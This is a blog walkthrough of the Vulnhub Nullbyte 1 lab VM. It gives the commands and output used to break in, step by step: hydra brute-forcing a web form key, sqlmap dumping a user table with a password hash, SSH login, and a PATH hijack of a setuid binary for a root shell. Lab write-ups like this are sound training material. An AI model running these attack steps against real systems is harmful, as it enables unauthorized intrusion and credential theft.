---
extends: default.liquid
title: Nullbyte 1 solution
date: 2015-08-25T19:03:50Z
---

I've been AFK for a while because of various reasons, but now I'm back and have managed to scrape a little time together to get on with some of [Vulnhub's](https://vulnhub.com) new VMs.

So let's start with [Nullbyte 1](https://www.vulnhub.com/entry/nullbyte-1,126/)

## Stage 1

I ran the usual service discovery and found:

```sourceCode
root@kali:~# nmap -sV 192.168.56.101

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-08-25 11:29 BST
Nmap scan report for 192.168.56.101
Host is up (0.00057s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

HTTP server on 80 and ssh on 777. I'm going to take the straightforward one, and head to the HTTP server first.

Upon opening the page I only get an image and some text

![image](https://i.imgur.com/SlVGKol.png)

I ran `dirbuster` on the root and got a couple of hits: `uploads` and `phpmyadmin`. The first had disabled directory listing and the second was a no go, but at least told me there was a SQL server available somewhere.

The source of the page doesn't reveal anything else either, so that last place we might be able to find something is the image itself. There doesn't appear to be any steganography involved here and nothing in the hexdump of the image either. Well, let me take a look at the EXIF data then.

```sourceCode
root@kali:~/Downloads# exiftool main.gif
ExifTool Version Number         : 9.74
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2015:08:25 10:27:37+01:00
File Access Date/Time           : 2015:08:25 10:28:35+01:00
File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
```

Hrmm, that comment looks unusual. Let's try that in the URL. Initially I got a 404 but that's because I didn't remove the `P-): `. Hitting `https://192.168.56.101/kzMb5nVYJw` takes me to a form asking for a key.

## Stage 2

Typing in something random just shows `invalid key`. Ok, let me take a look at the source, see where this thing goes.

```html
<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form>
</center>
<!-- this form isn't connected to mysql, password ain't that complex --!>
```

Ok, so no SQLi here then, and the password isn't complex either. I'm guessing a simple wordlist might solve this for me. Time to break out `hydra` for this:

```sourceCode
root@kali:~# hydra 192.168.56.101 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l x -P /usr/share/dict/words -t 10 -w 30
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://www.thc.org/thc-hydra) starting at 2015-08-25 11:41:58
[DATA] max 10 tasks per 1 server, overall 64 tasks, 99171 login tries (l:1/p:99171), ~154 tries per task
[DATA] attacking service http-post-form on port 80
[STATUS] 18687.00 tries/min, 18687 tries in 00:01h, 80484 todo in 00:05h, 10 active
[80][http-post-form] host: 192.168.56.101   login: x   password: elite
1 of 1 target successfully completed, 1 valid password found
```

Bingo. Once I enter that into the field I am able to search for usernames.

## Stage 3

Entering all sorts of names reveals nothing. At this point I am guessing this is the part that is backed by a SQL database. Although usernames and the usual SQLi synbols don't do much, entering nothing dumps multiple records. Maybe I will try to `sqlmap` the URL to see if there's any vulnerabilities there

```sourceCode
root@kali:~# sqlmap -u https://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=

<snip>

[11:13:26] [INFO] GET parameter 'usrtosearch' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)' injectable
[11:13:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:13:26] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[11:13:26] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:13:26] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[11:13:26] [INFO] target URL appears to have 3 columns in query
[11:13:26] [INFO] GET parameter 'usrtosearch' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
```

Result! Using this we can now dump the databasenames, tables, and data in the DB

(output shortened for clarity)

```sourceCode
root@kali:~# sqlmap -u https://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses --current-db
back-end DBMS: MySQL 5.0.12
[11:13:44] [INFO] fetching current database
current database:    'seth'

root@kali:~# sqlmap -u https://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses --tables -D seth
[11:13:55] [INFO] fetching tables for database: 'seth'
Database: seth
[1 table]
+-------+
| users |
+-------+


root@kali:~# sqlmap -u https://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses --dump -D seth -T users
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+
```

An MD5 hashed password? I best put that through [md5decoder](https://md5decoder.org/) to be rewarded with the password `omega`

## stage 4

Turns out that this is ramses's password on the ssh service that's running on port 777 on the VM. So I'll connect to that and have a look at what's going on there.

Not much in his home directory, so I'll checkout what he's been up to

```sourceCode
ramses@NullByte:~$ cat .bash_history
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch
clear
sudo -s
cd /
ls
exit
```

Interesting, ramses has something in `/var/www`. Seems like a setuid root binary called `procwatch`. After running it I would assume that it's just running `ps` to return a list of processes. If I run `ps` on its own, I get the same output (minus procwatch of course)

So let's see if it calls `ps` with an absolute path, or not. As a quick test I'll create a symlink to `ls` in the current directory and name it `ps`. Then I set the `PATH` environment variable with the current dir at the front.

```sourceCode
ramses@NullByte:/var/www/backup$ ln -s /bin/ls ps
ramses@NullByte:/var/www/backup$ export PATH=`pwd`:${PATH}
ramses@NullByte:/var/www/backup$ ./procwatch
ls  procwatch  ps  readme.txt
```

Excellent, it just calls `ps` without a path. A classic issue you can often find in programs that call other programs.

So let me leverage this to get myself a root shell and ultimately the flag

```sourceCode
ramses@NullByte:/var/www/backup$ ln -snf /bin/sh ps
ramses@NullByte:/var/www/backup$ ./procwatch
# whoami
root
# cat /root/proof.txt
[OUTPUT CUT]
```

And that concludes the NullByte VM walkthrough. A nice little machine with some fun challenges. Thanks to ly0n for creating it.
